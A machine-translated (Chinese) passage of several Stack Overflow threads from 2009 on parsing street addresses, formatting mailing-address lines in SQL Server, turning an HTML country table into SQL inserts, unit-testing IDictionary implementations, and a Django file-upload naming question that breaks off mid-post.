^(?<StreetNumber>[0-9]+)\s*(?<Predirection>(n)|(s)|(e)|(w)|(north)|(south)|(east)|(west))?\s+(?<StreetName>[a-z0-9 -'.]+)\s+(?<StreetType>[a-z.]+)$ 
```

但实际上，如果可能的话，最好将其委托给地址解析器，就像 NoahD 建议的那样。您可能需要进行一些挖掘才能为 .NET 找到一些东西，但如果您找不到任何东西，那么我肯定会使用正则表达式。

编辑：do'h，\s，而不是 /s

编辑：更改正则表达式以获得更多语义分组。您可以像这样访问组值：

```
string address = "123 n main st";
Regex regex = new Regex("insert the regex above here", RegexOptions.IgnoreCase); 
MatchCollection matches = regex.Matches(address);

foreach(Match match in matches)
{
    string streetAddress = matches.Groups["StreetAddress"];
    string predirection = matches.Groups["Predirection"];
    string streetName = matches.Groups["StreetName"];
    string streetType = matches.Groups["StreetType"];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T19:59:22.903

您可以在 Perl 中使用[Geo::StreetAddress::US执行此操作](http://metacpan.org/pod/Geo::StreetAddress::US)

例如：

```
  我的 $hashref = Geo::StreetAddress::US->parse_address(
                “华盛顿特区宾夕法尼亚大道 1600 号”）；

```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T21:51:59.793

使用 Google 的地理编码是否适合您的应用？

[http://code.google.com/apis/maps/documentation/services.html#Geocoding_Structured](http://code.google.com/apis/maps/documentation/services.html#Geocoding_Structured)

# sql - 如何改进此邮寄地址 SQL Server SELECT 语句？

> ID：651936
> 
> 赞同：2
> 
> 时间：2009-03-16T19:57:23.643
> 
> 标签：sql, sql-server, tsql

如何格式化邮寄地址，以便始终将所有非空行推到顶部？也就是说，我想将下面结构中的地址转换为邮寄地址。

这是结构：

```
[Line1] [varchar](50) NULL,
[Line2] [varchar](50) NULL,
[Line3] [varchar](50) NULL,
[City] [varchar](50) NULL,
[State] [varchar] (2) NULL,
[PostalCode] [varchar](50) NULL, 
```

以下是一些示例数据：

```
Line1=
Line2=123 Some Address
Line3=
City=Royal Oak
State=MI
ZIP=45673-2312 
```

结果如下所示**（应返回 4 个不同或单独的字段）**：

```
MailAddress1=123 Some Address
MailAddress2=ROYAL OAK MI 45673-2312
MailAddress3=
MailAddress4= 
```

我正在使用 SQL Server 2005。

有人在我们公司写了这个逻辑，它看起来很复杂（注意：这不是整个 SELECT 语句）：

```
,CASE 
  WHEN eai.Line1 IS NULL OR eai.Line1 = '' THEN 
    CASE 
      WHEN eai.Line2 IS NULL OR eai.Line2 = '' THEN 
        CASE 
          WHEN eai.Line3 IS NULL OR eai.Line3 = '' THEN ISNULL(LTRIM(RTRIM(eai.City)),'') + ' ' + ISNULL(LTRIM(RTRIM(eai.RegionCode)),'') + '  ' + ISNULL(LTRIM(RTRIM(eai.PostalCode)),'')
          ELSE eai.Line3
          END
      ELSE eai.Line2
      END
  ELSE eai.Line1
  END
,CASE 
  WHEN eai.Line1 IS NULL OR eai.Line1 = '' THEN
    CASE 
      WHEN eai.Line3 IS NULL OR eai.Line3 = '' THEN ISNULL(LTRIM(RTRIM(eai.City)),'') + ' ' + ISNULL(LTRIM(RTRIM(eai.RegionCode)),'') + '  ' + ISNULL(LTRIM(RTRIM(eai.PostalCode)),'')
      ELSE eai.Line3
      END
  ELSE 
    CASE 
      WHEN eai.Line2 IS NULL OR eai.Line2 = '' THEN 
        CASE 
          WHEN eai.Line3 IS NULL OR eai.Line3 = '' THEN ISNULL(LTRIM(RTRIM(eai.City)),'') + ' ' + ISNULL(LTRIM(RTRIM(eai.RegionCode)),'') + '  ' + ISNULL(LTRIM(RTRIM(eai.PostalCode)),'')
          ELSE eai.Line3
          END
      ELSE eai.Line2
      END
  END
,CASE
  WHEN eai.Line1 IS NULL OR eai.Line1 = '' THEN
    CASE 
      WHEN eai.Line2 IS NULL OR eai.Line2 = '' THEN NULL
      ELSE
        CASE 
          WHEN eai.Line3 IS NULL OR eai.Line3 = '' THEN NULL
          ELSE ISNULL(LTRIM(RTRIM(eai.City)),'') + ' ' + ISNULL(LTRIM(RTRIM(eai.RegionCode)),'') + '  ' + ISNULL(LTRIM(RTRIM(eai.PostalCode)),'')
          END
      END 
  ELSE
    CASE 
      WHEN eai.Line2 IS NULL OR eai.Line2 = '' THEN 
        CASE 
          WHEN eai.Line3 IS NULL OR eai.Line3 = '' THEN NULL
          ELSE ISNULL(LTRIM(RTRIM(eai.City)),'') + ' ' + ISNULL(LTRIM(RTRIM(eai.RegionCode)),'') + '  ' + ISNULL(LTRIM(RTRIM(eai.PostalCode)),'')
          END
      ELSE 
          CASE 
            WHEN eai.Line3 IS NULL OR eai.Line3 = '' THEN ISNULL(LTRIM(RTRIM(eai.City)),'') + ' ' + ISNULL(LTRIM(RTRIM(eai.RegionCode)),'') + '  ' + ISNULL(LTRIM(RTRIM(eai.PostalCode)),'')
            ELSE eai.Line3
            END
      END
  END
,CASE WHEN eai.Line2 IS NOT NULL AND eai.Line2 <> '' AND eai.Line3 IS NOT NULL AND eai.Line3 <> '' THEN eai.City + ' ' + eai.RegionCode + '  ' + eai.PostalCode ELSE NULL END 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-03-16T20:34:42.320

做到这一点的方法是使用 UNPIVOT。这是解决方案：

```
With AddrTable as (
Select AddrFld, MailAddr From (
Select Cast(ISNULL([Line1], '') as Varchar(102)) as [A1], 
       Cast(ISNULL([Line2], '') as Varchar(102)) as [A2], 
       Cast(ISNULL([Line3], '') as Varchar(102)) as [A3], 
       Cast(ISNULL(LTRIM(RTRIM(City)),'') + ' ' + ISNULL(LTRIM(RTRIM(RegionCode)),'') + '  ' + ISNULL(LTRIM(RTRIM(PostalCode)),'') as Varchar(102)) as A4
From TableName Where UniqueID=@UniqueID) p
Unpivot (MailAddr For AddrFld in ([A1], [A2], [A3], [A4])) as unpvt)
Select Row_Number() over (Order by (Case Len(MailAddr) When 0 then 1 else 0 end), AddrFld) as RN, 
MailAddr From AddrTable 
Order By RN 
```

这是输出：

```
Address1
Westby WI  55555
-empty line-
-empty line- 
```

请注意，我必须使用“Varchar(102)”作为字段长度（unpivot 要求所有字段都相同），因为您的城市/地区/邮政总共最多可以有 102 个字符。另外，请注意“@UniqueID”是您需要其地址的记录的标识符。这将返回四行并且总是*四行*，其中包含您的地址所需的数据。

***更新：***如果您需要将此作为一组四*列*而不是四行返回，则只需将其放入视图中，然后使用*Pivot*查询视图。为了完整起见，我在此处包含了视图，因为在创建视图时我必须稍微更改上面的内容，以便包含 uniqueID 字段并且没有进行排序（排序现在在查询中完成）：

```
Create View AddressRows AS
 With AddrTable as (
 Select UniqueID, AddrFld, MailAddr From (
 Select UniqueID, 
       Cast(ISNULL([Line1], '') as Varchar(102)) as [A1], 
       Cast(ISNULL([Line2], '') as Varchar(102)) as [A2], 
       Cast(ISNULL([Line3], '') as Varchar(102)) as [A3], 
       Cast(ISNULL(LTRIM(RTRIM(City)),'') + ' ' + ISNULL(LTRIM(RTRIM(RegionCode)),'') + '  ' + ISNULL(LTRIM(RTRIM(PostalCode)),'') as Varchar(102)) as A4
 From TableName Where UniqueID=@UniqueID) p
 Unpivot (MailAddr For AddrFld in ([A1], [A2], [A3], [A4])) as unpvt)
 Select UniqueID, 
       Row_Number() over (Order by (Case Len(MailAddr) When 0 then 1 else 0 end), AddrFld) as RN, 
       MailAddr From AddrTable 
```

然后，当您想拉出匹配的“行”时，使用此 SQL 将其转回（注意我正在使用 UniqueID 再次查询）：

```
Select [Addr1], [Addr2], [Addr3], [Addr4] From (
Select Top 4 'Addr' + Cast(Row_Number() over (Order by RN) as Varchar(12)) as AddrCol,  -- "Top 4" needed so we can sneak the "Order By" in 
MailAddr 
From AddressRows Where UniqueID=@UniqueID
) p PIVOT (Max([MailAddr]) for AddrCol in ([Addr1], [Addr2], [Addr3], [Addr4])
) as pvt 
```

这将返回：

```
Addr1            Addr2                Addr3           Addr4
--------------   ------------------   -------------   ------------------ 
Address1         Westby WI  54667 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T20:11:23.903

这是一个三分钟投资的解决方案：

```
DECLARE @address TABLE (
    [Line1] [varchar](50) NULL,
    [Line2] [varchar](50) NULL,
    [Line3] [varchar](50) NULL,
    [City] [varchar](50) NULL,
    [State] [varchar] (2) NULL,
    [PostalCode] [varchar](50) NULL
)

INSERT INTO @address (
    [Line1],
    [Line2],
    [Line3],
    [City],
    [State],
    [PostalCode]
)
VALUES (
    NULL,
    '123 Some Address',
    NULL,
    'Royal Oak',
    'MI',
    '45673-2312'
)

SELECT * FROM @address

SELECT
      ISNULL(Line1 + CHAR(13), '')
    + ISNULL(Line2 + CHAR(13), '')
    + ISNULL(Line3 + CHAR(13), '')
    + ISNULL(City    + ' ',    '')
    + ISNULL([State] + ' ',    '')
    + ISNULL(PostalCode,       '')
FROM @address 
```

结果：

```
123 Some Address
Royal Oak MI 45673-2312 
```

摆弄控制字符，直到获得所需的结果。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T20:09:37.467

 `````
SELECT 
    LTRIM(RTRIM(LINE1)) + LTRIM(RTRIM(LINE2)) + LTRIM(RTRIM(LINE3)) AS MailAddress1,
    LTRIM(RTRIM(CITY)) + ' ' + LTRIM(RTRIM(STATE)) + ' ' + LTRIM(RTRIM(POSTALCODE)) AS MailAddress2
FROM MyTable

````  `# c# - 我需要将 HTML 格式的国家/地区列表解析为 SQL 插入。有没有更简单的方法来做到这一点？

> ID：651947
> 
> 赞同：0
> 
> 时间：2009-03-16T20:01:09.110
> 
> 标签：c#, database, parsing

大约有 2000 行，因此手动操作可能比想办法以编程方式完成任务需要更多的工作。它只需要工作一次，所以我不关心性能或任何东西。

```
<tr><td>Canada (CA)</td><td>Alberta (AB)</td></tr>
<tr><td>Canada (CA)</td><td>British Columbia (BC)</td></tr>
<tr><td>Canada (CA)</td><td>Manitoba (MB)</td></tr> 
```

基本上它的格式是这样的，我需要把它分成4部分，国家名称，国家缩写，部门名称和部门缩写。

为了与我完全缺乏效率保持一致，我打算只做一个字符串。在我分解它们之后替换 HTML 标签，然后只找到左括号的索引并抓住剩余的空格分隔字符串。然后我意识到我无法跟踪哪个是国家，哪个是部门，也无法弄清楚如何按国家对它们进行分组。

那么有没有更好的方法来做到这一点？或者更好的是，使用国家和省/州填充数据库的更简单方法？我环顾四周，我能找到的唯一现成的数据库没有提供国家或省/州的全名，也没有使用 IP 代替地理名称。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T20:03:44.220

1.  将其粘贴到电子表格中。一些电子表格会为您解析 HTML 表格。

2.  将其保存为 .CSV 文件并以这种方式处理。 **或**。在电子表格中添加一列，内容如下：

    ="INSERT INTO COUNTRY(CODE,NAME) VALUES=('" & A1 & "','" & B1 & "');"

然后，您有一列可以剪切、粘贴和执行的 INSERT 语句。

* * *

**编辑**

`<table>`粘贴到电子表格时请务必包含标签。

```
<table><tr><th>country</th><th>name></th></tr>
<tr><td>Canada (CA)</td><td>Alberta (AB)</td></tr>
<tr><td>Canada (CA)</td><td>British Columbia (BC)</td></tr>
<tr><td>Canada (CA)</td><td>Manitoba (MB)</td></tr>
</table> 
```

处理 CSV 文件几乎不需要解析。它有引号和逗号。比 XML/HTML 更容易使用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T20:16:37.590

```
/<tr><td>([^\s]+)\s\(([^\)])\)<\/td><td>([^\s]+)\s\(([^\)])\)<\/td><\/tr>/ 
```

然后你应该有来自任何 PCRE 引擎的 4 条数据的 4 次捕获:)

或者，像[http://jacksleight.com/assets/blog/really-shiny/scripts/table-extractor.txt](http://jacksleight.com/assets/blog/really-shiny/scripts/table-extractor.txt)这样的东西提供了更多的完整性。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T20:06:15.493

听起来像一个正则表达式很容易解决的问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-16T20:14:39.777

我最近[了解到](http://twitter.com/spolsky)，如果您从 Excel 打开一个 url，它将尝试解析表格数据。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-16T20:14:54.147

如果您能够在浏览器（Internet Explorer）中看到此表，您可以选择整个表，右键单击 &“导出到 Microsoft Excel”

我猜这应该可以帮助您将数据放入单独的列中。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-16T20:05:23.327

您必须以编程方式执行此操作吗？如果没有，我可以建议**将表格（从浏览器）复制并粘贴到 MS Excel 上**，然后清除所有格式吗？这样你就可以得到一个很好的表，然后可以毫无问题地导入你的数据库。

只是一个建议...... hth

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-16T20:10:45.543

.Net 存在一个名为`System.Xml`;的程序集。您只需引用程序集并将您的 HTML 文档转换为[`System.Xml.XmlDocument`](http://msdn.microsoft.com/en-us/library/system.xml.xmldocument(VS.71).aspx)，即可轻松查明包含所需数据的 HTML 节点，并使用子节点将其添加到您的数据中。这需要您进行很少的字符串解析。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-03-16T20:16:27.170

将 HTML 数据加载为 XElement，使用 LINQ 获取所需的值，然后插入。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-03-16T20:27:32.493

在这里吹我自己的小号，但我的 FOSS 工具[CSVfix](http://code.google.com/p/csvfix/)将结合 read_xml 和 sql_insert 命令来完成。

# c# - 如何对 IDictionary 的实现进行单元测试

> ID：651948
> 
> 赞同：6
> 
> 时间：2009-03-16T20:01:31.637
> 
> 标签：c#, unit-testing

在实现实现 IDictionary 的东西时，我应该对什么进行单元测试？

测试整个界面似乎有点矫枉过正，但是我知道什么？我才进行了几天的单元测试...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T20:03:29.057

您应该测试您实现的所有内容。如果您有通过公共接口调用的代码，则应该有一个支持它的单元测试。如果您编写代码，则值得测试。

例外可能是简单的属性（ Property {get; set;} ）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T20:05:15.870

测试所有的接口点，但要小心测试框架的诱惑。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-16T20:38:27.567

IDictionary 的每个公共成员都应该进行测试。您还应该设置一些测试以确保您的 IDictionary 的行为与 IDictionary 的其他一些具体实现相同。事实上，您可以像这样构建大部分测试：

```
void Test_IDictionary_Add(IDictionary a, IDictionary b)
{
    string key = "Key1", badKey = 87;
    int value = 9, badValue = "Horse";

    a.Add(key, value);
    b.Add(key, value);

    Assert.That(a.Count, Is.EqualTo(b.Count));
    Assert.That(a.Contains(key), Is.EqualTo(b.Contains(key)));
    Assert.That(a.ContainsKey(key), Is.EqualTo(b.ContainsKey(key)));
    Assert.That(a.ContainsValue(value), Is.EqualTo(b.ContainsValue(value)));
    Assert.That(a.Contains(badKey), Is.EqualTo(b.Contains(badKey)));
    Assert.That(a.ContainsValue(badValue), Is.EqualTo(b.ContainsValue(badValue)));
    // ... and so on and so forth
}

[Test]
void MyDictionary_Add()
{
    Test_IDictionary_Add(new MyDictionary(), new Hashtable());
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-10-14T12:50:47.950

您应该测试您的界面公开的所有成员。

下面是我调用来测试我的对象的例程，它实现了`IDictionary(Of TKey, TValue)`. 这是在**VB.Net**中，但我认为有人可能会觉得它很有用。

注意：如果您正在处理对象集合而不是结构，您可能希望使用`CollectionAssert.AreEqual`允许定义`IComparer`.

## 测试方法

```
Public Sub TestBatch_SomeContext()

    Dim TestedDictionary As IDictionary(Of Integer, String) = New ObjectDictionary()
    Dim ControlDictionary As IDictionary(Of Integer, String) = New Dictionary(Of Integer, String)
    Dim MyTestingSet As New TestingRoutines.Collections.Testing_IDictionary(Of Integer, String)(ControlDictionary, TestedDictionary)

    Dim SomeKeys() As Integer = {8, 3, 4, 1, 12, 45, 98, 65}
    Dim SomeValues() As String = {"mopet", "789", "%*+", "15/12/1995", "", "Europe", "abcd", "okay"}
    Dim OtherKeys() As Integer = {11, 22, 33, 44, 55, 101}
    Dim OtherValues() As String = {"a value?", "words in here", "06/01/2010", "something", "Europe", "voila"}
    MyTestingSet.TestFullBatch(SomeKeys, SomeValues, OtherKeys, OtherValues)

End Sub 
```

## 通用测试程序

```
Namespace TestingRoutines.Collections

    ''' <summary>
    ''' A testing routine which compares the state of a tested dictionary (not trusted) against the state of control dictionary (trusted), after applying the same operations to both.
    ''' </summary>
    ''' <typeparam name="TKey">The type of keys in the dictionary.</typeparam>
    ''' <typeparam name="TValue">The type of values in the dictionary.</typeparam>
    Public Class Testing_IDictionary(Of TKey, TValue)

        ''' <summary>
        ''' The trusted dictionary implementation to verify the tests against.
        ''' </summary>
        Public ReadOnly Property ControlDict As IDictionary(Of TKey, TValue)

        ''' <summary>
        ''' The non-trusted dictionary implementation to be tested.
        ''' </summary>
        Public ReadOnly Property TestedDict As IDictionary(Of TKey, TValue)

        ''' <summary>
        ''' Exoses a set of generic tests.
        ''' </summary>
        Private ReadOnly Property GenericTests As New GenericTests(Of IDictionary(Of TKey, TValue))

        Private Sub New()
        End Sub

        ''' <summary>
        ''' Creates a new instance of a testing routine which compares the state of a tested dictionary (not trusted) against the state of control dictionary (trusted), after applying the same operations to both.
        ''' </summary>
        ''' <param name="ControlDict">The trusted dictionary implementation to verify the tests against.</param>
        ''' <param name="TestedDict">The non-trusted dictionary implementation to be tested.</param>
        Public Sub New(ControlDict As IDictionary(Of TKey, TValue), TestedDict As IDictionary(Of TKey, TValue))
            Me.ControlDict = ControlDict
            Me.TestedDict = TestedDict
        End Sub

        ''' <summary>
        ''' Runs the complete set of tests available in the testing routine.
        ''' </summary>
        ''' <param name="SomeKeys">The keys of some items to be added in the dictionary. Minimum 6 items; all keys must be unique.</param>
        ''' <param name="SomeValues">The values of some items to be added in the dictionary. There must be as many values as item keys.</param>
        ''' <param name="OtherKeys">The keys of some items which are different from the items to be added in the dictionary. Minimum 6 items; all keys must be unique.</param>
        ''' <param name="OtherValues">The values of some items which are different from the items to be added in the dictionary. there must be as many values as item keys</param>
        Public Sub TestFullBatch(SomeKeys As IEnumerable(Of TKey), SomeValues As IEnumerable(Of TValue), OtherKeys As IEnumerable(Of TKey), OtherValues As IEnumerable(Of TValue))

            Dim MinAddCount As Integer = 6
            If SomeKeys.Count < MinAddCount Then Throw New ArgumentException($"This test requires at least {MinAddCount} item keys to be added.", NameOf(SomeKeys))
            If SomeKeys.Count <> SomeValues.Count Then Throw New ArgumentException("There must be as many item values as item keys to be added.", NameOf(SomeValues))
            If SomeKeys.Any(Function(p) SomeKeys.Count(Function(q) p.Equals(q)) > 1) Then Throw New ArgumentException("The collection of item keys to be added cannot contain duplicates.", NameOf(SomeKeys))

            Dim MinNotAddedCount As Integer = 6
            If OtherKeys.Count < MinNotAddedCount Then Throw New ArgumentException($"This test requires at least {MinNotAddedCount} item keys to be tested as not added.", NameOf(OtherKeys))
            If OtherKeys.Count <> OtherValues.Count Then Throw New ArgumentException("There must be as many item values as item keys to be tested as not added.", NameOf(OtherValues))
            If OtherKeys.Any(Function(p) OtherKeys.Count(Function(q) p.Equals(q)) > 1) Then Throw New ArgumentException("The collection of item keys to be tested as not added cannot contain duplicates.", NameOf(OtherKeys))
            If OtherKeys.Any(Function(p) SomeKeys.Contains(p)) Then Throw New ArgumentException("The item keys to be tested as not added cannot appear in the list of item keys to be added.", NameOf(OtherKeys))

            IsReadOnly()

            Add(SomeKeys, SomeValues, OtherKeys, OtherValues)

            Remove(SomeKeys.Skip(1).Take(2))
            Remove(SomeKeys.Reverse.Take(2))

            Clear()

            AddItem(SomeKeys, SomeValues, OtherKeys, OtherValues)

            RemoveItem(SomeKeys.Take(2), SomeValues.Take(2))
            RemoveItem(SomeKeys.Reverse.Skip(2).Take(2), SomeValues.Reverse.Skip(2).Take(2))

            Dim ArrayKeys As IEnumerable(Of TKey) = OtherKeys.Take(MinNotAddedCount - 2).ToArray
            Dim ArrayValues As IEnumerable(Of TValue) = OtherValues.Take(MinNotAddedCount - 2).ToArray
            CopyTo(ArrayKeys, ArrayValues, MinNotAddedCount - 4)

        End Sub

        ''' <summary>
        ''' Verifies the IsReadOnly property.
        ''' </summary>
        Public Sub IsReadOnly()

            Assert.AreEqual(Me.TestedDict.IsReadOnly, Me.ControlDict.IsReadOnly)

        End Sub

        ''' <summary>
        ''' Verifies the Add(Key, Value) method.
        ''' </summary>
        ''' <param name="AddKeys">The item keys to add.</param>
        ''' <param name="AddValues">The item values to add.</param>
        ''' <param name="NotAddedKeys">The item keys which are expected not be included in the dictionary.</param>
        ''' <param name="NotAddedValues">The item values which are expected not to be included in the dictionary.</param>
        Public Sub Add(AddKeys As IEnumerable(Of TKey), AddValues As IEnumerable(Of TValue), NotAddedKeys As IEnumerable(Of TKey), NotAddedValues As IEnumerable(Of TValue))

            Dim MyKeyEnum As IEnumerator(Of TKey) = AddKeys.GetEnumerator
            Dim MyValueEnum As IEnumerator(Of TValue) = AddValues.GetEnumerator

            Do While MyKeyEnum.MoveNext And MyValueEnum.MoveNext
                Dim MyKey As TKey = MyKeyEnum.Current
                Dim MyValue As TValue = MyValueEnum.Current
                Me.ControlDict.Add(MyKey, MyValue)
                Me.TestedDict.Add(MyKey, MyValue)
            Loop

            TestBasicContents()

            TestItem(AddKeys.First, AddValues.First)
            TestItem(AddKeys.Last, AddValues.Last)
            TestItem(NotAddedKeys.First, NotAddedValues.First)
            TestItem(NotAddedKeys.Last, NotAddedValues.Last)

        End Sub

        ''' <summary>
        ''' Verifies the Add(KeyValuePair) method.
        ''' </summary>
        ''' <param name="AddKeys">The item keys to add.</param>
        ''' <param name="AddValues">The item values to add.</param>
        ''' <param name="NotAddedKeys">The item keys which are expected not to be included in the dictionary.</param>
        ''' <param name="NotAddedValues">The item values which are expected not to be included in the dictionary.</param>
        Public Sub AddItem(AddKeys As IEnumerable(Of TKey), AddValues As IEnumerable(Of TValue), NotAddedKeys As IEnumerable(Of TKey), NotAddedValues As IEnumerable(Of TValue))

            Dim MyKeyEnum As IEnumerator(Of TKey) = AddKeys.GetEnumerator
            Dim MyValueEnum As IEnumerator(Of TValue) = AddValues.GetEnumerator
            Do While MyKeyEnum.MoveNext And MyValueEnum.MoveNext
                Dim MyKey As TKey = MyKeyEnum.Current
                Dim MyValue As TValue = MyValueEnum.Current
                Dim KeyValue As New KeyValuePair(Of TKey, TValue)(MyKey, MyValue)
                Me.ControlDict.Add(KeyValue)
                Me.TestedDict.Add(KeyValue)
            Loop

            TestBasicContents()

            TestItem(AddKeys.First, AddValues.First)
            TestItem(AddKeys.Last, AddValues.Last)
            TestItem(NotAddedKeys.First, NotAddedValues.First)
            TestItem(NotAddedKeys.Last, NotAddedValues.Last)

        End Sub

        ''' <summary>
        ''' Verifies the Remove(Key) method.
        ''' </summary>
        ''' <param name="RemoveKeys">The item keys of the items to remove.</param>
        Public Sub Remove(RemoveKeys As IEnumerable(Of TKey))

            For Each MyKey As TKey In RemoveKeys
                Me.ControlDict.Remove(MyKey)
                Me.TestedDict.Remove(MyKey)
            Next

            TestBasicContents()

        End Sub

        ''' <summary>
        ''' Verifies the Remove(KeyValuePair) method.
        ''' </summary>
        ''' <param name="RemoveKeys">The item keys to remove.</param>
        ''' <param name="RemoveValues">The item values to remove.</param>
        Public Sub RemoveItem(RemoveKeys As IEnumerable(Of TKey), RemoveValues As IEnumerable(Of TValue))

            Dim MyKeyEnum As IEnumerator(Of TKey) = RemoveKeys.GetEnumerator
            Dim MyValueEnum As IEnumerator(Of TValue) = RemoveValues.GetEnumerator

            Do While MyKeyEnum.MoveNext And MyValueEnum.MoveNext
                Dim MyKey As TKey = MyKeyEnum.Current
                Dim MyValue As TValue = MyValueEnum.Current
                Dim KeyValue As New KeyValuePair(Of TKey, TValue)(MyKey, MyValue)
                Me.ControlDict.Remove(KeyValue)
                Me.TestedDict.Remove(KeyValue)
            Loop

            TestBasicContents()

        End Sub

        ''' <summary>
        ''' Verifies the Clear() method.
        ''' </summary>
        Public Sub Clear()

            Me.ControlDict.Clear()
            Me.TestedDict.Clear()

            TestBasicContents()

        End Sub

        ''' <summary>
        ''' Verifies the CopyTo(array(), arrayIndex) method.
        ''' </summary>
        ''' <param name="ArrayKeys">The collection of item keys to include in the list of KeyValuePairs to copy from..</param>
        ''' <param name="ArrayValues">The collection of item values to include in the list of KeyValuePairs to copy from.</param>
        ''' <param name="ArrayIndex">The zero-based array index at which copying will begin.</param>
        Public Sub CopyTo(ArrayKeys As IEnumerable(Of TKey), ArrayValues As IEnumerable(Of TValue), ArrayIndex As Integer)

            Dim MyCollection As New List(Of KeyValuePair(Of TKey, TValue))

            Dim MyKeyEnum As IEnumerator(Of TKey) = ArrayKeys.GetEnumerator
            Dim MyValueEnum As IEnumerator(Of TValue) = ArrayValues.GetEnumerator
            Do While MyKeyEnum.MoveNext And MyValueEnum.MoveNext
                Dim MyKey As TKey = MyKeyEnum.Current
                Dim MyValue As TValue = MyValueEnum.Current
                Dim KeyValue As New KeyValuePair(Of TKey, TValue)(MyKey, MyValue)
                MyCollection.Add(KeyValue)
            Loop

            Dim MyControlArray(99) As KeyValuePair(Of TKey, TValue) ' <- Note: Fixed size array
            Dim MyTestingArray(99) As KeyValuePair(Of TKey, TValue) ' <- Note: Fixed size array
            MyCollection.CopyTo(MyControlArray, 0)
            MyCollection.CopyTo(MyTestingArray, 0)

            Me.ControlDict.CopyTo(MyControlArray, ArrayIndex)
            Me.TestedDict.CopyTo(MyTestingArray, ArrayIndex)

            CollectionAssert.AreEqual(MyControlArray, MyTestingArray)

        End Sub

#Region "Helpers"

        ''' <summary>
        ''' Verifies state equality of the control and tested dictionaries. This is achieved by comparing the Count, Keys, and Values properties.
        ''' </summary>
        Private Sub TestBasicContents()

            Assert.AreEqual(Me.ControlDict.Count, Me.TestedDict.Count)
            CollectionAssert.AreEqual(Me.ControlDict.Keys.ToList, Me.TestedDict.Keys.ToList)
            CollectionAssert.AreEqual(Me.ControlDict.Values.ToList, Me.TestedDict.Values.ToList)

        End Sub

        ''' <summary>
        ''' Verifies behaviour equality of the control and tested dictionaries, for a given item. This is achieved by comparing the ContainsKey(Key), Contains(KeyValuePair), TryGetValue(Key, Value)
        ''' </summary>
        ''' <param name="Key">The key of the item to look for.</param>
        ''' <param name="Value">The value of the item to look for.</param>
        Private Sub TestItem(Key As TKey, Value As TValue)

            Dim KeyValue As New KeyValuePair(Of TKey, TValue)(Key, Value)

            Assert.AreEqual(Me.ControlDict.ContainsKey(Key), Me.TestedDict.ContainsKey(Key))
            Assert.AreEqual(Me.ControlDict.Contains(KeyValue), Me.TestedDict.Contains(KeyValue))

            Dim MyControlVal As TValue
            Dim MyTestingVal As TValue
            Assert.AreEqual(Me.ControlDict.TryGetValue(Key, MyControlVal), Me.TestedDict.TryGetValue(Key, MyTestingVal))
            Assert.AreEqual(MyControlVal, MyTestingVal)

            GenericTests.TestExceptionBehaviour(Me.ControlDict, Me.TestedDict, Function(p) p.Item(Key))
            GenericTests.TestExceptionBehaviour(Me.ControlDict, Me.TestedDict, Sub(p) p.Item(Key) = Value)
            GenericTests.TestExceptionBehaviour(Me.ControlDict, Me.TestedDict, Sub(p) p.Add(Key, Value))
            GenericTests.TestExceptionBehaviour(Me.ControlDict, Me.TestedDict, Sub(p) p.Add(KeyValue))
            GenericTests.TestExceptionBehaviour(Me.ControlDict, Me.TestedDict, Function(p) p.Remove(Key))
            GenericTests.TestExceptionBehaviour(Me.ControlDict, Me.TestedDict, Function(p) p.Remove(KeyValue))

        End Sub

#End Region

    End Class

End Namespace 
```

## 附加助手

```
Namespace TestingRoutines

    ''' <summary>
    ''' Exposes a set of generic tests.
    ''' </summary>
    ''' <typeparam name="T">The type of the object to be tested.</typeparam>
    Public Class GenericTests(Of T)

        ''' <summary>
        ''' Exposes a set of  generic tests.
        ''' </summary>
        Sub New()
        End Sub

        ''' <summary>
        ''' Asserts a given action on a tested object throws an exception, when and only when the same action on a control object triggers an exception of that same type.
        ''' <para>Note only the exception types are verified, not the content of their message or exception code.</para>
        ''' </summary>
        ''' <param name="ControlObject">The trusted object to compare the behaviour with.</param>
        ''' <param name="TestedObject">The non-trusted object to be tested.</param>
        ''' <param name="Action">The tested action on the objects.</param>
        Public Sub TestExceptionBehaviour(ControlObject As T, TestedObject As T, Action As Action(Of T))

            Dim ControlThrowedException As Boolean

            Try
                ControlThrowedException = True
                Action.Invoke(ControlObject)
                ControlThrowedException = False
                Action.Invoke(TestedObject)
            Catch ex As Exception
                If Not ControlThrowedException Then Assert.Fail($"Unexpected exception. The tested object threw an exception whilst the control object did not: {ex.ToString}")
                Try
                    Action.Invoke(TestedObject)
                    Assert.Fail($"Expected exception. The control object threw an exception whilst the tested object did not: {ex.ToString}")
                Catch ex2 As Exception
                    If ex.GetType <> ex2.GetType Then Assert.Fail($"Exception types mismatch. The control object threw an exception of type '{ex.GetType.ToString}' whilst the tested object threw an exception of type '{ex2.GetType.ToString}'.")
                End Try
            End Try

        End Sub

    End Class

End Namespace 
```

# python - Django：访问models.filefield（upload_to）位置中的主键

> ID：651949
> 
> 赞同：15
> 
> 时间：2009-03-16T20:02:38.810
> 
> 标签：python, django, file-io

我想使用条目的主键保存我的文件。

这是我的代码：

```
def get_nzb_filename(instance, filename):
    if not instance.pk:
        instance.save() # Does not work.
    name_slug = re.sub('[^a-zA-Z0-9]', '-', instance.name).strip('-').lower()
    name_slug = re.sub('[-]+', '-', name_slug)
    return u'files/%s_%s.nzb' % (instance.pk, name_slug)

class File(models.Model):
    nzb = models.FileField(upload_to=get_nzb_filename)
    name = models.CharField(max_length=256) 
```

我知道第一次保存对象时主键不可用，所以我愿意为了获取主键而额外保存对象，然后继续。

上面的代码不起作用。它抛出以下错误：

```
